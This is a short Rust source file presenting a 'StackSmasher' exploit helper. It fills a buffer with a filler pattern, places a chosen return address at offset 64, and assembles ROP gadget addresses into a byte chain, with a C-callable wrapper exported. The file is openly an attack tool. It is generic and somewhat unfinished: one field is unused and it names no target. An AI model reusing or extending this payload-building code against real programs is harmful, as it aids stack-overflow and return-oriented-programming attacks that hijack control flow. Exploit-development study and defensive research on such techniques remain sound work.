use std::ptr;
use libc::{self, c_void};

pub struct StackSmasher {
    target_addr: u64,
    ret_addr: u64,
}

impl StackSmasher {
    pub fn new(target: u64, ret: u64) -> Self {
        Self { 
            target_addr: target,
            ret_addr: ret 
        }
    }
    
    pub fn smash(&self, buf: *mut u8, size: usize) -> Result<(), Box<dyn std::error::Error>> {
        unsafe {
            // basic stack overflow
            let pattern = b"AAAABBBBCCCCDDDD";
            let mut offset = 0;
            
            // fill buffer with pattern
            while offset + pattern.len() <= size {
                ptr::copy_nonoverlapping(
                    pattern.as_ptr(),
                    buf.add(offset),
                    pattern.len()
                );
                offset += pattern.len();
            }
            
            // overwrite return address at calculated offset
            if size >= 72 {
                let ret_ptr = buf.add(64) as *mut u64;
                ptr::write(ret_ptr, self.ret_addr);
            }
            
            Ok(())
        }
    }
    
    pub fn build_rop(&self, gadgets: &[u64]) -> Vec<u8> {
        let mut chain = Vec::new();
        
        for &gadget in gadgets {
            chain.extend_from_slice(&gadget.to_le_bytes());
        }
        
        chain
    }
}

#[no_mangle]
pub extern "C" fn rust_stack_smash(buf: *mut u8, size: usize, ret_addr: u64) -> i32 {
    if buf.is_null() || size == 0 {
        return -1;
    }
    
    let smasher = StackSmasher::new(0, ret_addr);
    match smasher.smash(buf, size) {
        Ok(_) => 0,
        Err(_) => -1,
    }
}
